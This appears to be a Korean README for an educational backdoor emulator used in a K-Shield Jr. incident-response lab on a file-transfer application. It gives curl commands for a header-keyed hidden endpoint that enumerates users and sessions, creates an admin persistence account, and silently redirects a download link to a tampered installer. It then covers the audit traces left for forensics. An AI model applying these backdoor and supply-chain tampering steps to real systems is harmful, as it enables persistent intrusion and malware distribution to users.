# ganda-it-webshell

> ganda-it-webshell_human2.php

`human2.php`는 K-Shield Jr. 침해사고 대응 프로젝트에서 사용하는 **교육용 MFT 애플리케이션 백도어 에뮬레이터**이다.

운영체제 명령 실행이나 쉘 생성 기능은 없으며, 실습용 `mft` 데이터베이스를 대상으로 다음 기능만 수행한다.

* 파일 목록 조회
* 사용자 목록 조회
* 세션 목록 조회
* Guest Download 공유 정보 조회
* 교육용 관리자 계정 생성
* 기존 Guest Download 링크가 가리키는 파일 변경

## 1. 파일 위치

웹 서버에 다음 경로로 배치한다.

```text
/var/www/html/human2.php
```

`human2.php` 내부에서는 다음 DB 연결 파일을 사용한다.

```text
/var/www/src/db.php
```

따라서 `db.php`가 정상적으로 존재하고 `mft` 데이터베이스에 연결되어 있어야 한다.

## 2. 인증 방식

모든 요청에는 다음 HTTP 헤더가 필요하다.

```text
X-MFT-Key: execute
```

헤더가 없거나 값이 다르면 서버는 `404 Not Found`를 반환한다.

기본 요청 예시는 다음과 같다.

```bash
curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=users'
```

`mft.local` 대신 실제 실습 서버의 IP 주소 또는 도메인을 사용하면 된다.

예:

```bash
curl -H 'X-MFT-Key: execute' 'http://192.168.10.20/human2.php?action=users'
```

## 3. 사용 가능한 기능

### 3.1 파일 목록 확인

사용 액션:

```text
action=list
```

명령:

```bash
curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=list'
```

확인 가능한 정보:

```text
파일 ID
소유자 ID
소유자 계정
원본 파일명
서버 저장 파일명
생성 시간
```

예:

```json
[
    {
        "id": 4,
        "owner_id": 3,
        "owner": "deployer",
        "original_name": "installer.exe",
        "storage_name": "f_1004.bin",
        "created_at": "2026-09-07 09:00:00"
    }
]
```

공급망 변조 시나리오에서는 이 기능을 이용해 정상 `installer.exe`의 `file_id`를 확인한다.

초기 DB에서는 정상 설치 파일이 다음과 같이 등록되어 있다.

```text
file_id      : 4
owner        : deployer
original_name: installer.exe
storage_name : f_1004.bin
```

## 3.2 사용자 목록 확인

사용 액션:

```text
action=users
```

명령:

```bash
curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=users'
```

확인 가능한 정보:

```text
사용자 ID
계정명
권한
계정 생성 시간
```

초기 DB에서는 다음 계정이 존재한다.

```text
admin
test
deployer
hospital
```

비밀번호 해시는 출력하지 않는다.

## 3.3 세션 목록 확인

사용 액션:

```text
action=sessions
```

명령:

```bash
curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=sessions'
```

확인 가능한 정보:

```text
session_id
user_id
username
role
expires_at
```

초기 DB에는 실습을 위한 관리자 세션이 하나 존재한다.

```text
8c3f6a1d9e42b750c4d2816fa037be95
```

해당 세션의 사용자는 다음과 같다.

```text
admin
```

## 3.4 Guest Download 공유 정보 확인

사용 액션:

```text
action=shares
```

명령:

```bash
curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=shares'
```

확인 가능한 정보:

```text
share_id
file_id
original_name
storage_name
token
active
```

초기 DB에서 정상 `installer.exe`는 다음 공유 정보와 연결되어 있다.

```text
share_id : 4
file_id  : 4
file     : installer.exe
storage  : f_1004.bin
token    : 4e9a6d58c3f27b1a80d4e7c2fa9136b85d0c42ab71fe9934
active   : 1
```

즉 초기 상태는 다음과 같다.

```text
Guest Download Token
        ↓
shares.file_id = 4
        ↓
files.id = 4
        ↓
정상 installer.exe
```

## 4. 관리자 계정 생성

사용 액션:

```text
action=create_user
```

이 기능은 공격자가 별도의 지속 접근용 관리자 계정을 생성한 상황을 재현하기 위한 기능이다.

기본 계정명은 다음과 같다.

```text
svc_backup
```

명령:

```bash
curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=create_user'
```

계정명을 직접 지정할 수도 있다.

```bash
curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=create_user&name=svc_backup'
```

생성되는 계정:

```text
Username : svc_backup
Password : Temp1234!
Role     : admin
```

성공 시 예:

```json
{
    "created": true,
    "id": 5,
    "username": "svc_backup",
    "role": "admin",
    "demo_password": "Temp1234!"
}
```

이미 동일한 계정이 존재하면 새로 생성하지 않고 오류를 반환한다.

생성된 계정으로 정상 웹 로그인 기능을 사용할 수 있다.

## 5. Guest Download 파일 바꿔치기

### 5.1 기능 설명

사용 액션:

```text
action=replace_share
```

이 기능은 기존 Guest Download 링크의 Token을 변경하지 않고, 해당 링크가 가리키는 `file_id`만 변경한다.

즉 사용자가 가지고 있는 다운로드 URL은 그대로 유지되지만 실제 다운로드되는 파일만 다른 파일로 변경된다.

사용 형식:

```text
human2.php?action=replace_share
&token=<Guest Download Token>
&file_id=<새로운 파일 ID>
```

### 5.2 정상 상태 확인

먼저 현재 공유 상태를 확인한다.

```bash
curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=shares'
```

초기 상태에서 `installer.exe` 공유 정보는 다음과 같다.

```text
share_id = 4
file_id  = 4
token    = 4e9a6d58c3f27b1a80d4e7c2fa9136b85d0c42ab71fe9934
```

구조:

```text
4e9a6d58c3f27b1a80d4e7c2fa9136b85d0c42ab71fe9934
        ↓
shares.file_id = 4
        ↓
installer.exe
        ↓
f_1004.bin
```

### 5.3 변조 파일 업로드

공격자는 `svc_backup` 등의 관리자 계정을 이용해 관리자 페이지에 로그인한 뒤 변조된 `installer.exe`를 업로드한다.

실습에서는 실제 악성코드 대신 단순 마커 파일을 사용할 수 있다.

예:

```bash
printf 'KSHIELD SUPPLY CHAIN COMPROMISE DEMO\n' > evil-installer.exe
```

웹 UI 또는 관리자 업로드 기능을 이용해 해당 파일을 업로드한다.

업로드 후 파일 목록을 다시 확인한다.

```bash
curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=list'
```

예를 들어 결과가 다음과 같다고 가정한다.

```text
ID 4
installer.exe
f_1004.bin

ID 5
installer.exe
f_a82b31.bin
```

이 경우:

```text
file_id 4 = 정상 deployer 설치 파일
file_id 5 = 공격자가 업로드한 변조 파일
```

이다.

### 5.4 공유 링크 대상 변경

정상 Guest Download Token:

```text
4e9a6d58c3f27b1a80d4e7c2fa9136b85d0c42ab71fe9934
```

변조 파일:

```text
file_id = 5
```

인 경우 다음 요청을 보낸다.

```bash
curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=replace_share&token=4e9a6d58c3f27b1a80d4e7c2fa9136b85d0c42ab71fe9934&file_id=5'
```

성공하면 대략 다음과 같은 JSON 응답이 반환된다.

```json
{
    "changed": true,
    "share_id": 4,
    "token": "4e9a6d58c3f27b1a80d4e7c2fa9136b85d0c42ab71fe9934",
    "before": {
        "file_id": 4,
        "original_name": "installer.exe",
        "storage_name": "f_1004.bin"
    },
    "after": {
        "file_id": 5,
        "original_name": "installer.exe",
        "storage_name": "f_a82b31.bin"
    }
}
```

### 5.5 변경 결과 확인

다시 공유 정보를 조회한다.

```bash
curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=shares'
```

변경 전:

```text
share_id = 4
file_id  = 4
token    = 동일
```

변경 후:

```text
share_id = 4
file_id  = 5
token    = 동일
```

즉 다음과 같이 변경된다.

#### 변경 전

```text
Guest Token
    ↓
shares.file_id = 4
    ↓
정상 installer.exe
```

#### 변경 후

```text
Guest Token
    ↓
shares.file_id = 5
    ↓
변조 installer.exe
```

중요한 점은 다음 Token 값은 바뀌지 않는다는 것이다.

```text
4e9a6d58c3f27b1a80d4e7c2fa9136b85d0c42ab71fe9934
```

따라서 기존에 이 링크를 전달받은 사용자는 URL 변경을 인지하지 못한다.

## 6. audit_logs에 남는 흔적

`replace_share` 기능을 사용하면 `audit_logs` 테이블에 변경 기록이 남는다.

예:

```text
username   = human2
event_type = SHARE_TARGET_CHANGE
target     = Guest Download Token
success    = 1
detail     = share file_id changed from 4 to 5
```

따라서 DFIR 단계에서는 해당 이벤트를 이용해 공유 링크 변조 시점을 추적할 수 있다.

확인할 핵심 정보:

```text
변조 발생 시간
요청 출발지 IP
변경 전 file_id
변경 후 file_id
대상 Guest Download Token
```

## 7. 전체 공격 시나리오 사용 순서

### ① 파일 목록 확인

```bash
curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=list'
```

정상 `installer.exe`의 ID를 확인한다.

초기값:

```text
file_id = 4
```

### ② 사용자 확인

```bash
curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=users'
```

정상 계정 구조를 확인한다.

```text
admin
test
deployer
hospital
```

### ③ 세션 확인

```bash
curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=sessions'
```

활성 관리자 세션 등의 정보를 확인한다.

### ④ 공유 정보 확인

```bash
curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=shares'
```

정상 배포 파일과 Guest Download Token의 매핑 관계를 확인한다.

### ⑤ 관리자 계정 생성

```bash
curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=create_user&name=svc_backup'
```

생성 계정:

```text
svc_backup
Temp1234!
admin
```

### ⑥ svc_backup으로 로그인

웹 서비스의 정상 로그인 페이지에서 다음 계정으로 로그인한다.

```text
Username: svc_backup
Password: Temp1234!
```

관리자 페이지 접근 여부를 확인한다.

### ⑦ 변조 installer.exe 업로드

관리자 업로드 기능을 이용해 실습용 변조 파일을 업로드한다.

업로드 후:

```bash
curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=list'
```

새 파일의 `file_id`를 확인한다.

예:

```text
file_id = 5
```

### ⑧ Guest Download 링크 대상 변경

```bash
curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=replace_share&token=4e9a6d58c3f27b1a80d4e7c2fa9136b85d0c42ab71fe9934&file_id=5'
```

결과:

```text
Before
file_id = 4

After
file_id = 5
```

### ⑨ 공유 상태 재확인

```bash
curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=shares'
```

동일한 Token이 새로운 `file_id`를 가리키는지 확인한다.

### ⑩ 기존 Guest Download 링크 접근

기존 사용자가 사용하던 동일한 Guest Download URL을 호출한다.

예:

```text
/guest.php?token=4e9a6d58c3f27b1a80d4e7c2fa9136b85d0c42ab71fe9934
```

URL과 Token은 바뀌지 않았지만 실제 다운로드 파일은 공격자가 업로드한 파일로 변경된다.

## 8. 빠른 명령어 모음

```bash
# 파일 목록
curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=list'
```

```bash
# 사용자 목록
curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=users'
```

```bash
# 세션 목록
curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=sessions'
```

```bash
# Guest Download 공유 목록
curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=shares'
```

```bash
# 관리자 계정 생성
curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=create_user&name=svc_backup'
```

```bash
# Guest Download 대상 파일 변경
curl -H 'X-MFT-Key: execute' 'http://mft.local/human2.php?action=replace_share&token=4e9a6d58c3f27b1a80d4e7c2fa9136b85d0c42ab71fe9934&file_id=5'
```

## 9. human2.php의 시나리오상 역할

`human2.php`는 SQL Injection 자체를 대체하는 기능이 아니라, 초기 침투 이후 공격자가 MFT 애플리케이션을 지속적으로 제어하기 위해 사용하는 **제한된 애플리케이션 백도어**를 모사한다.

전체 시나리오는 다음과 같이 구성한다.

```text
Guest Download SQL Injection
        ↓
사용자 및 세션 정보 노출
        ↓
관리자 세션 확보
        ↓
human2.php 접근
        ↓
파일 / 사용자 / 세션 / 공유 정보 정찰
        ↓
svc_backup 관리자 계정 생성
        ↓
정상 관리자 로그인
        ↓
변조 installer.exe 업로드
        ↓
human2.php replace_share
        ↓
shares.file_id 변경
        ↓
기존 Guest Download 링크를 통한 변조 파일 배포
```

역할을 구분하면 다음과 같다.

```text
SQL Injection
= 초기 침투 및 인증 정보 획득

human2.php
= 침투 이후 MFT 애플리케이션 제어

svc_backup
= 지속적인 정상 인증 경로

replace_share
= 공급망 배포 대상 변조
```

## 10. 공급망 변조 핵심

이 실습에서 핵심은 파일 이름이나 Guest Download URL 자체를 변경하는 것이 아니다.

정상 상태:

```text
사용자가 알고 있는 Guest Download URL
        ↓
Token A
        ↓
file_id 4
        ↓
정상 installer.exe
```

공격 후:

```text
사용자가 알고 있는 동일한 Guest Download URL
        ↓
동일한 Token A
        ↓
file_id 5
        ↓
변조 installer.exe
```

즉 신뢰받던 배포 경로는 그대로 유지하면서 내부 참조 관계만 변경하는 방식으로 공급망 침해 상황을 재현한다.

## 11. 주의사항

본 프로그램은 K-Shield Jr. 침해사고 대응 프로젝트를 위한 교육용 코드이다.

다음 기능은 포함하지 않는다.

```text
OS 명령 실행
웹쉘 명령 실행
Reverse Shell
프로세스 실행
파일 시스템 임의 명령 수행
외부 C2 통신
Raw SQL 실행
임의 테이블 수정
```

`replace_share` 기능 역시 임의 SQL 실행 기능이 아니라 기존 `shares.file_id`를 지정된 파일 ID로 변경하는 제한된 실습 기능이다.

실습용으로 구축된 격리 환경에서만 사용한다.
